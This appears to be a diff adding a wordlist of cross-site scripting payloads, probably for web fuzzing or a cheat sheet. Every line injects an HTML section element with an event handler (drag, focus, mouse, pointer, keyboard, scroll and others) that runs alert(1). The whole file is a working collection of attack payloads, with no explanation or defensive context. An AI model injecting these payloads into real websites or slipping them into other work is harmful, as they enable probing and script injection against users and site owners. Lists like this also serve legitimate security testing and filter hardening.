@@ -1,0 +1,38 @@
+<section contenteditable onbeforeinput=alert(1)>test
+<section draggable="true" ondrag="alert(1)" style=display:block>test</section>
+<section draggable="true" ondragend="alert(1)" style=display:block>test</section>
+<section draggable="true" ondragenter="alert(1)" style=display:block>test</section>
+<section draggable="true" ondragleave="alert(1)" style=display:block>test</section>
+<section draggable="true" ondragstart="alert(1)" style=display:block>test</section>
+<section id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></section>
+<section id=x tabindex=1 onfocus=alert(1)></section>
+<section id=x tabindex=1 onfocusin=alert(1)></section>
+<section onafterscriptexecute=alert(1)><script>1</script>
+<section onbeforescriptexecute=alert(1)><script>1</script>
+<section onblur=alert(1) id=x tabindex=1 style=display:block>test</section><input value=clickme>
+<section onclick="alert(1)" style=display:block>test</section>
+<section oncontextmenu="alert(1)" style=display:block>test</section>
+<section oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<section oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<section ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</section>
+<section onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</section><input value=clickme>
+<section onkeydown="alert(1)" contenteditable style=display:block>test</section>
+<section onkeypress="alert(1)" contenteditable style=display:block>test</section>
+<section onkeyup="alert(1)" contenteditable style=display:block>test</section>
+<section onmousedown="alert(1)" style=display:block>test</section>
+<section onmouseenter="alert(1)" style=display:block>test</section>
+<section onmouseleave="alert(1)" style=display:block>test</section>
+<section onmousemove="alert(1)" style=display:block>test</section>
+<section onmouseout="alert(1)" style=display:block>test</section>
+<section onmouseover="alert(1)" style=display:block>test</section>
+<section onmouseup="alert(1)" style=display:block>test</section>
+<section onmousewheel=alert(1) style=display:block>requires scrolling
+<section onpointerdown=alert(1) style=display:block>XSS</section>
+<section onpointerenter=alert(1) style=display:block>XSS</section>
+<section onpointerleave=alert(1) style=display:block>XSS</section>
+<section onpointermove=alert(1) style=display:block>XSS</section>
+<section onpointerout=alert(1) style=display:block>XSS</section>
+<section onpointerover=alert(1) style=display:block>XSS</section>
+<section onpointerrawupdate=alert(1) style=display:block>XSS</section>
+<section onpointerup=alert(1) style=display:block>XSS</section>
+<section onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></section>
